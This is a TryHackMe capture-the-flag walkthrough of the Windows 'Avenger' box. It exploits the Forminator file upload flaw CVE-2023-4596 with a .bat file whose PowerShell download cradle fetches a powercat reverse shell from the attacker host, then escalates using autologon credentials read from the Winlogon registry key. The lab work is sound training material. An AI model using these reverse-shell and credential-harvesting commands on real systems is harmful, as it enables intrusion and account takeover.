---
title: "Avenger"
type: docs
tags:
  - thm
  - windows
  - medium
  - wordpress
  - forminator
  - cve-2023-4596
  - autologon
  - registry
---

<div class="callout callout-info">

**Box Info**

**Platform:** TryHackMe, **OS:** Windows (XAMPP), **Difficulty:** Medium

</div>

<div class="callout callout-abstract">

**Attack Path**

1. Dir brute → `/gift/` is a **WordPress** site (`avenger.tryhackme` vhost). WPScan → **Forminator 1.24.1**.
2. **CVE-2023-4596**, Forminator unrestricted file upload → drop a `.bat` that pulls a PowerShell reverse shell → shell as the web user (`hugo`).
3. Apache runs as `LocalSystem` but isn't directly abusable. Instead read `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
   ```
   AutoAdminLogon = 1
   DefaultUserName = hugo
   DefaultPassword = SurpriseMF123!
   ```
4. RDP / `runas` as `hugo` → start an elevated PowerShell → administrator.

</div>

<div class="callout callout-key">

**Credentials**

- `hugo` : `SurpriseMF123!` (Winlogon autologon)

</div>

---

## Full Walkthrough

I started with a directory brute-force against the web application using `ffuf`, mostly to get a sense of what was actually hosted before touching anything else, and one result immediately stood out: a directory that led into a WordPress installation.

```bash
┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/avenger] - [Sat Apr 13, 23:37]
└─[$]> ffuf -w /usr/share/SecLists/Discovery/Web-Content/raft-small-words.txt -c -u 'https://avenger.thm/FUZZ' -t 200  

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : https://avenger.thm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/Web-Content/raft-small-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

.htm                    [Status: 403, Size: 302, Words: 22, Lines: 10]
.html                   [Status: 403, Size: 302, Words: 22, Lines: 10]
img                     [Status: 301, Size: 335, Words: 22, Lines: 10]
webalizer               [Status: 403, Size: 421, Words: 37, Lines: 12]
phpmyadmin              [Status: 403, Size: 302, Words: 22, Lines: 10]
.                       [Status: 200, Size: 2060, Words: 219, Lines: 22]
wordpress               [Status: 301, Size: 341, Words: 22, Lines: 10]
.htaccess               [Status: 403, Size: 302, Words: 22, Lines: 10]
dashboard               [Status: 301, Size: 341, Words: 22, Lines: 10]
.htc                    [Status: 403, Size: 302, Words: 22, Lines: 10]
gift                    [Status: 301, Size: 336, Words: 22, Lines: 10]
IMG                     [Status: 301, Size: 335, Words: 22, Lines: 10]
Img                     [Status: 301, Size: 335, Words: 22, Lines: 10]
.html_var_DE            [Status: 403, Size: 302, Words: 22, Lines: 10]
licenses                [Status: 403, Size: 421, Words: 37, Lines: 12]
server-status           [Status: 403, Size: 421, Words: 37, Lines: 12]
Dashboard               [Status: 301, Size: 341, Words: 22, Lines: 10]
.htpasswd               [Status: 403, Size: 302, Words: 22, Lines: 10]
con                     [Status: 403, Size: 302, Words: 22, Lines: 10]
.html.                  [Status: 403, Size: 302, Words: 22, Lines: 10]
xampp                   [Status: 301, Size: 337, Words: 22, Lines: 10]
.html.html              [Status: 403, Size: 302, Words: 22, Lines: 10]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

The page also had a search bar, and out of habit I tried searching for something arbitrary just to see how the application handled it. The response leaked a second domain for this machine, `avenger.tryhackme`, which hadn't shown up in my scanning yet.

With a proper WordPress vhost in hand, I ran `wpscan` against it next to enumerate the plugin and theme landscape rather than guessing at what might be outdated.

```bash
┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/avenger] - [Sat Apr 13, 23:52]
└─[$]> wpscan --url http://avenger.tryhackme/gift/ -e ap  --disable-tls-checks 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.24
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://avenger.tryhackme/gift/ [10.10.246.199]
[+] Started: Sat Apr 13 23:55:06 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
 |  - X-Powered-By: PHP/8.0.28
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://avenger.tryhackme/gift/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://avenger.tryhackme/gift/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://avenger.tryhackme/gift/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://avenger.tryhackme/gift/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.2.2 identified (Insecure, released on 2023-05-20).
 | Found By: Rss Generator (Passive Detection)
 |  - http://avenger.tryhackme/gift/feed/, <generator>https://wordpress.org/?v=6.2.2</generator>
 |  - http://avenger.tryhackme/gift/comments/feed/, <generator>https://wordpress.org/?v=6.2.2</generator>

[+] WordPress theme in use: astra
 | Location: http://avenger.tryhackme/gift/wp-content/themes/astra/
 | Last Updated: 2024-04-05T00:00:00.000Z
 | Readme: http://avenger.tryhackme/gift/wp-content/themes/astra/readme.txt
 | [!] The version is out of date, the latest version is 4.6.11
 | Style URL: http://avenger.tryhackme/gift/wp-content/themes/astra/style.css
 | Style Name: Astra
 | Style URI: https://wpastra.com/
 | Description: Astra is fast, fully customizable & beautiful WordPress theme suitable for blog, personal portfolio,...
 | Author: Brainstorm Force
 | Author URI: https://wpastra.com/about/?utm_source=theme_preview&utm_medium=author_link&utm_campaign=astra_theme
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 4.1.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://avenger.tryhackme/gift/wp-content/themes/astra/style.css, Match: 'Version: 4.1.5'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] forminator
 | Location: http://avenger.tryhackme/gift/wp-content/plugins/forminator/
 | Last Updated: 2024-04-08T12:36:00.000Z
 | [!] The version is out of date, the latest version is 1.29.3
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.24.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://avenger.tryhackme/gift/wp-content/plugins/forminator/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://avenger.tryhackme/gift/wp-content/plugins/forminator/readme.txt

[+] ultimate-addons-for-gutenberg
 | Location: http://avenger.tryhackme/gift/wp-content/plugins/ultimate-addons-for-gutenberg/
 | Last Updated: 2024-04-10T13:24:00.000Z
 | [!] The version is out of date, the latest version is 2.12.8
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 2.6.9 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://avenger.tryhackme/gift/wp-content/plugins/ultimate-addons-for-gutenberg/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://avenger.tryhackme/gift/wp-content/plugins/ultimate-addons-for-gutenberg/readme.txt

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Apr 13 23:55:12 2024
[+] Requests Done: 2
[+] Cached Requests: 38
[+] Data Sent: 646 B
[+] Data Received: 105.904 KB
[+] Memory used: 261.285 MB
[+] Elapsed time: 00:00:05
```

That scan gave me a full picture of what was installed, and one result jumped out right away: the **Forminator** plugin, sitting well behind its latest release at version 1.24.1. Checking that version against known Forminator vulnerabilities confirmed it was affected by an unrestricted file upload bug, meaning I could upload essentially any file type and have the server execute it on request. Since this was a Windows target running Apache under XAMPP, my plan was to drop a `.bat` file that would pull down and execute a PowerShell reverse shell rather than fight with a payload format this stack might not run the way I wanted.

```bash
┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/avenger] - [Sun Apr 14, 17:40]
└─[$]> powercat -c 10.6.59.97 -p 9001 -e cmd -g > baphomet.ps1

┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/avenger] - [Sun Apr 14, 17:41]
└─[$]> echo "powershell -c IEX (New-Object System.Net.Webclient).DownloadString('http://10.6.59.97:8000/payload.ps1')" > rev.bat

┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/avenger] - [Sun Apr 14, 17:42]
└─[$]> python3 -m http.server                                 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.147.186 - - [14/Apr/2024 17:43:15] code 404, message File not found
10.10.147.186 - - [14/Apr/2024 17:43:15] "GET /payload.ps1 HTTP/1.1" 404 -
10.10.147.186 - - [14/Apr/2024 17:43:43] code 404, message File not found
10.10.147.186 - - [14/Apr/2024 17:43:43] "GET /payload.ps1 HTTP/1.1" 404 -
10.10.147.186 - - [14/Apr/2024 17:44:14] "GET /baphomet.ps1 HTTP/1.1" 200 -
10.10.147.186 - - [14/Apr/2024 17:44:14] code 404, message File not found
10.10.147.186 - - [14/Apr/2024 17:44:14] "GET /payload.ps1 HTTP/1.1" 404 -
10.10.147.186 - - [14/Apr/2024 17:44:44] code 404, message File not found
10.10.147.186 - - [14/Apr/2024 17:44:44] "GET /payload.ps1 HTTP/1.1" 404 -
10.10.147.186 - - [14/Apr/2024 17:44:44] "GET /baphomet.ps1 HTTP/1.1" 200 -
10.10.147.186 - - [14/Apr/2024 17:45:14] code 404, message File not found
10.10.147.186 - - [14/Apr/2024 17:45:14] "GET /payload.ps1 HTTP/1.1" 404 -
10.10.147.186 - - [14/Apr/2024 17:45:15] "GET /baphomet.ps1 HTTP/1.1" 200 -
10.10.147.186 - - [14/Apr/2024 17:45:45] code 404, message File not found
10.10.147.186 - - [14/Apr/2024 17:45:45] "GET /payload.ps1 HTTP/1.1" 404 -
```

Sure enough, not long after uploading the bat file, the target reached out and fetched my PowerShell stager, and the listener I already had waiting caught the resulting shell:

```bash
┌─[abadd0n@EX3CP01S0N] - [~/thm/boxes/avenger] - [Sun Apr 14, 17:40]
└─[$]> rlwrap nc -lnvvp 9001        
Listening on 0.0.0.0 9001
Connection received on 10.10.147.186 49840
Microsoft Windows [Version 10.0.17763.4499]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

For anyone wanting the deeper technical breakdown of this bug, there's good detail on [ExploitDB](https://www.exploit-db.com/exploits/51664) and in the [public PoC on GitHub](https://github.com/E1A/CVE-2023-4596/blob/main/exploit.py) for CVE-2023-4596.

With the user flag grabbed, privilege escalation turned out to be more manual than usual, since AV on the box got in the way of running the automated enumeration scripts I'd normally lean on. So I worked through the running services by hand instead, and `Apache` stood out as worth a closer look given this was a Windows box hosting it.

```bash
C:\Users\hugo\Desktop>sc qc Apache2.4
sc qc Apache2.4
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: Apache2.4
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\xampp\apache\bin\httpd.exe" -k runservice
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Apache2.4
        DEPENDENCIES       : Tcpip
                           : Afd
        SERVICE_START_NAME : LocalSystem

C:\Users\hugo\Desktop>
```

`Apache2.4` was running as `LocalSystem`, which meant that if I could get it to execute anything on my behalf, whether by modifying a config file it would reload or replacing a binary it would call, I'd have a path to full administrative privileges.

That angle didn't pan out for me directly, so I pivoted to checking the registry for anything Windows commonly leaves lying around, and `Winlogon` was the obvious place to look for stored logon credentials. Sure enough, it had autologon configured with a full set of credentials for the user `hugo`, which I used to RDP into the machine and start an elevated PowerShell session as `administrator`:

```bash
PS C:\xampp\htdocs> reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    DisableBackButton    REG_DWORD    0x1
    EnableSIHostIntegration    REG_DWORD    0x1
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ    
    LegalNoticeText    REG_SZ    
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    ShellCritical    REG_DWORD    0x0
    ShellInfrastructure    REG_SZ    sihost.exe
    SiHostCritical    REG_DWORD    0x0
    SiHostReadyTimeOut    REG_DWORD    0x0
    SiHostRestartCountLimit    REG_DWORD    0x0
    SiHostRestartTimeGap    REG_DWORD    0x0
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    WinStationsDisabled    REG_SZ    0
    scremoveoption    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    LastLogOffEndTimePerfCounter    REG_QWORD    0x4f6c9151
    ShutdownFlags    REG_DWORD    0x13
    AutoAdminLogon    REG_SZ    1
    DefaultUserName    REG_SZ    hugo
    DefaultPassword    REG_SZ    SurpriseMF123!
    AutoLogonSID    REG_SZ    S-1-5-21-1966530601-3185510712-10604624-1008
    LastUsedUsername    REG_SZ    hugo
    ShellAppRuntime    REG_SZ    ShellAppRuntime.exe

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\AlternateShells
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\DefaultPassword
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\GPExtensions
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\UserDefaults
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\AutoLogonChecked
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon\VolatileUserMgrKey
```
